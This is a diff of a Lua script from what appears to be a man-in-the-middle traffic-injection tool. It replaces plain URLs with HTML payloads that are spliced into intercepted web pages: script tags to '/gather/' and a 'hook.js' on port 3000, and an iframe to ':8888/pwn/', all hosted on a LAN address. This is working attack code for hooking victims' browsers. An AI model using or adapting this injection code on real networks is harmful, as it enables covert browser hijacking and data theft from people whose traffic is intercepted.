@@ -106,9 +106,9 @@ local inject_patterns = {
   nocase("(><a[> ])")
 }
 local inject_urls = {
-   'http://192.168.50.50/a',
-   'http://192.168.50.50/b',
-   'http://192.168.50.50/c'
+   '<script src="http://192.168.50.50/gather/"></script>',
+   '<script src="http://192.168.50.50:3000/hook.js"></script>',
+   '<iframe src="http://192.168.50.50:8888/pwn/"></iframe>'
 }
 
 function inject_body(session_data,orig_body)
@@ -139,7 +139,7 @@ function inject_body(session_data,orig_body)
     end
     ip_session_data.time = os.time()
   end
-  local inject_string = "<script src=\"" .. inject_urls[ip_session_data.count] .. "\"></script>%1"
+  local inject_string = inject_urls[ip_session_data.count] 
 
   local inject_str_len = string.len(inject_string) - 2
   local delta = orig_body_len - shrunk_body_len - inject_str_len
